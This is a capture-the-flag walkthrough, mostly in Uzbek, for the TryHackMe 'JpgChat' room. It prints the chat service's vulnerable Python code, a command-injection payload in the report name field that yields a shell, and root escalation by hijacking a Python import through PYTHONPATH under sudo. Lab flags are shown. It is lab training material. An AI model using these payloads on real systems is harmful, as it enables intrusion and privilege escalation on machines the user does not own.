# JpgChat

Room: https://tryhackme.com/room/jpgchat

## Razvetka 

Port Scanning:

```
╭─mete   󰉖 ~
╰─ ❯❯ rustscan -a 10.10.8.89 -- -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports: The virtual equivalent of knocking on doors.

[~] The config file is expected to be at "/home/mete/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.8.89:22
Open 10.10.8.89:3000
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sV" on ip 10.10.8.89
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-16 00:39 +05
NSE: Loaded 47 scripts for scanning.
Initiating Ping Scan at 00:39
Scanning 10.10.8.89 [2 ports]
Completed Ping Scan at 00:39, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 00:39
Completed Parallel DNS resolution of 1 host. at 00:39, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 00:39
Scanning 10.10.8.89 [2 ports]
Discovered open port 22/tcp on 10.10.8.89
Completed Connect Scan at 00:39, 0.20s elapsed (2 total ports)
Initiating Service scan at 00:39
Scanning 1 service on 10.10.8.89
Completed Service scan at 00:39, 0.41s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.8.89.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 00:39
Completed NSE at 00:39, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 00:39
Completed NSE at 00:39, 0.00s elapsed
Nmap scan report for 10.10.8.89
Host is up, received conn-refused (0.20s latency).
Scanned at 2025-06-16 00:39:45 +05 for 1s

PORT     STATE  SERVICE REASON       VERSION
22/tcp   open   ssh     syn-ack      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
3000/tcp closed ppp     conn-refused
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.99 seconds
```

Qiziq...

## Tizimni o'rganish

Keling NetCat orqali 3000 portga qaraymiz.

```
nc 10.10.8.89 3000
```

Natija:

```
╭─mete   󰉖 ~
╰─ ❯❯ nc 10.10.8.89 3000
Trying 10.10.8.89...
Connected to 10.10.8.89.
Escape character is '^]'.
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
```



**Source code**ni qidiramiz:

```
JPChat in:name
```

Dastur kodi:

```
#!/usr/bin/env python3

import os

print ('Welcome to JPChat')
print ('the source code of this service can be found at our admin\'s github')

def report_form():

	print ('this report will be read by Mozzie-jpg')
	your_name = input('your name:\n')
	report_text = input('your report:\n')
	os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
	os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)

def chatting_service():

	print ('MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel')
	print ('REPORT USAGE: use [REPORT] to report someone to the admins (with proof)')
	message = input('')

	if message == '[REPORT]':
		report_form()
	if message == '[MESSAGE]':
		print ('There are currently 0 other users logged in')
		while True:
			message2 = input('[MESSAGE]: ')
			if message2 == '[REPORT]':
				report_form()

chatting_service()
```

Command Injection qila olamiz chog'i...



Zaiflikdan foydalanish:

```
╭─mete   󰉖 ~
╰─ ❯❯ nc 10.10.8.89 3000
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
[REPORT]
this report will be read by Mozzie-jpg
your name:
'; /bin/bash -i # 
your report:
ls

whoami
wes
python3 -c 'import pty; pty.spawn("/bin/bash")'
wes@ubuntu-xenial:/$
```

Bingo! Bish! Bash! Bosh!

user.txt'ni qo'lga kiritish.

```
wes@ubuntu-xenial:/$ cd home
cd home
wes@ubuntu-xenial:/home$ ls
ls
wes
wes@ubuntu-xenial:/home$ cd wes
cd wes
wes@ubuntu-xenial:~$ ls
ls
user.txt
wes@ubuntu-xenial:~$ cat user.txt
cat user.txt
JPC{487030410a543503cbb59ece16178318}
```



## Privilage Escalation

Imkoniyatlar:

```
wes@ubuntu-xenial:~$ sudo -l
sudo -l
Matching Defaults entries for wes on ubuntu-xenial:
    mail_badpass, env_keep+=PYTHONPATH

User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
```

Eskalatsiya jarayoni:

```
wes@ubuntu-xenial:~$ cat /opt/development/test_module.py   
cat /opt/development/test_module.py
#!/usr/bin/env python3

from compare import *

print(compare.Str('hello', 'hello', 'hello'))
wes@ubuntu-xenial:~$ ls -lah cat /opt/development/test_module.py   
ls -lah cat /opt/development/test_module.py
ls: cannot access 'cat': No such file or directory
-rw-r--r-- 1 root root 93 Jan 15  2021 /opt/development/test_module.py
wes@ubuntu-xenial:~$ echo 'import os; os.system("/bin/bash")' > /tmp/compare.py   
echo 'import os; os.system("/bin/bash")' ><import os; os.system("/bin/bash")' > /tmp/compare.py                        
wes@ubuntu-xenial:~$ sudo PYTHONPATH=/tmp /usr/bin/python3 /opt/development/test_module.py   
<YTHONPATH=/tmp /usr/bin/python3 /opt/development/test_module.py             
root@ubuntu-xenial:~# whoami
whoami
root
```

Tavsif: PYTHONPATH + Import Hijacking

root.txt'ni qo'lga kiritish:

```
root@ubuntu-xenial:~# cat /root/root.txt
cat /root/root.txt
JPC{665b7f2e59cf44763e5a7f070b081b0a}

Also huge shoutout to Westar for the OSINT idea
i wouldn't have used it if it wasnt for him.
and also thank you to Wes and Optional for all the help while developing

You can find some of their work here:
https://github.com/WesVleuten
https://github.com/optionalCTF
```



# Nafas olar ekanman, men yana davom etaman...